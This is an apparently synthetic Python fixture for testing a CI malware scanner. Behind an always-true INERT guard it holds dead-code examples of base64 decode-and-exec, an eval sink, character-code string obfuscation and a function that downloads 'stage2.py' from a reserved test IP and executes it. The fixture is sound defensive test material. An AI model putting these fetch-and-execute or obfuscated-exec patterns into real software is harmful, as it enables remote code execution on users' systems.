"""INERT malware detection fixture — DO NOT wire into the app.

This is a synthetic sample for exercising the CI malware scanner. It is
deliberately harmless: the `INERT` flag below is always True, so every
dangerous branch is dead code and the module does nothing when imported
or run. It exists only so a scanner has recognizable "bad" Python to flag.
"""

import base64

# Master kill-switch. Left permanently on so no payload branch executes.
INERT = True

# A base64 blob a scanner would decode and inspect. Here it decodes to a
# harmless print, not a real payload.
_ENCODED_PAYLOAD = base64.b64encode(
    b"print('inert scanner test payload — nothing happened')"
).decode()

# Obfuscated string reassembly — a classic evasion pattern (still benign).
_OBFUSCATED_CMD = "".join(chr(c) for c in [112, 114, 105, 110, 116])  # "print"


def run_encoded_payload() -> None:
    """Decode-and-exec pattern. Guarded so it never actually runs."""
    if INERT:
        return
    decoded = base64.b64decode(_ENCODED_PAYLOAD).decode()
    exec(decoded)  # noqa: S102  (intentional — scanner bait, never reached)


def dynamic_eval(expr: str) -> object:
    """Dynamic eval sink. Guarded so untrusted input is never evaluated."""
    if INERT:
        return None
    return eval(expr)  # noqa: S307  (intentional — scanner bait, never reached)


def download_and_run(url: str) -> None:
    """Download-and-execute pattern pointing at a non-routable test IP."""
    if INERT:
        return
    import urllib.request

    # 192.0.2.0/24 is RFC 5737 TEST-NET-1 — reserved for docs, unroutable.
    code = urllib.request.urlopen("http://192.0.2.10/stage2.py").read()
    exec(code)  # noqa: S102  (intentional — scanner bait, never reached)


if __name__ == "__main__":
    # Running the file directly is a no-op by design.
    print("This is an inert scanner test fixture. Nothing executed.")
